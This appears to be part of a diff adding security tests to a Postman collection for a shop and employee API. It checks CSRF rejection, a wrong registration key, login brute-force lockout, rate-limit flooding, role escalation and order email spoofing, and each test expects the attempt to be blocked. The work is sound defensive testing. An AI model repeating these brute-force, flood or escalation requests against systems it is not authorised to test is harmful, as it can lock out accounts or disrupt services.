+              "raw": "{\n  \"phone\": \"0900000000\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Authenticated session (access_token cookie present from a prior login in this run) but with NO X-CSRF-Token header. csrfProtection should reject with 403."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"blocked by CSRF middleware\", () => pm.response.code === 403);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Wrong CSRF Token on Protected Mutation",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "not-the-real-token",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/customers/me",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "customers",
+                "me"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"phone\": \"0900000000\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "timingSafeEqual compare against the real csrf_token cookie should reject a mismatched token with 403."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"blocked by CSRF middleware\", () => pm.response.code === 403);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Wrong Employee Registration Key",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "X-Employee-Registration-Key",
+                "value": "totally-wrong-key",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/employees",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "employees"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"firstName\": \"Fake\",\n  \"lastName\": \"Employee\",\n  \"companyEmail\": \"fake.employee@todaywegrind.com\",\n  \"password\": \"Passw0rd!23\",\n  \"role\": \"staff\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Even with a valid admin/staff session, a wrong x-employee-registration-key must be rejected before the use case runs."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"rejected\", () => [401, 403].includes(pm.response.code));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Brute Force Login (repeat manually or via Collection Runner)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/auth/employee-login",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "auth",
+                "employee-login"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{employeeEmail}}\",\n  \"password\": \"wrong-password-attempt\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Run this request 5-6x in a row (Collection Runner, set iterations) against the same email. After 5 failed attempts the account should lock (Account is no longer active / 401 on further tries even with the correct password) per the login lockout rule. Each failure also emits a login_fail security event; the security agent polls these every 60s and may escalate to ALERT_EMAIL or TEMP_BLOCK_IP if the IP crosses its thresholds - check server logs / admin tooling for the resulting SecurityEvent, not this response."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"unauthorized\", () => pm.response.code === 401);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Rate Limit Flood - Auth Endpoint",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/auth/employee-login",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "auth",
+                "employee-login"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{employeeEmail}}\",\n  \"password\": \"{{employeePassword}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Run this via Collection Runner with iterations > AUTH_LOGIN_RATE_MAX within AUTH_LOGIN_RATE_WINDOW (check .env for current values). Expect 429 once the window's request budget is exceeded; a rate_limit_hit security event is recorded by the global fastify-rate-limit onExceeded hook."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"either ok or rate limited\", () => [200, 401, 429].includes(pm.response.code));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Role Escalation Attempt - Staff Cannot Set Own Role to Admin",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/employees/{{employeeId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "employees",
+                "{{employeeId}}"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"role\": \"admin\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Log in as a staff account before running this. UpdateEmployeeUseCase must reject role: 'admin' from a staff actor with 403 ForbiddenError."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"forbidden for staff actor\", () => pm.response.code === 403);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Order Spoofing Attempt - customerEmail in Body Ignored",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/orders",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "orders"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"totalCents\": 1000,\n  \"currency\": \"VND\",\n  \"shippingFullName\": \"Attacker\",\n  \"shippingAddress\": \"123 Nowhere\",\n  \"shippingPhone\": \"0900000000\",\n  \"customerEmail\": \"victim@example.com\",\n  \"items\": [\n    {\n      \"productName\": \"Test\",\n      \"priceCents\": 1000,\n      \"quantity\": 1\n    }\n  ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "CreateOrderBody has no customerEmail field, so this extra field must be ignored (or rejected if schema is strict); the created order's customerEmail must equal the logged-in customer's own session email, never victim@example.com. Manually verify the response."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"created (or rejected) but never attributed to the spoofed email\", () => { if (pm.response.code === 201) { pm.expect(pm.response.json().customerEmail).to.not.eql(\"victim@example.com\"); } });"
+                ]
+              }
+            }
+          ]
+        }
+      ]
     }
   ]
 }
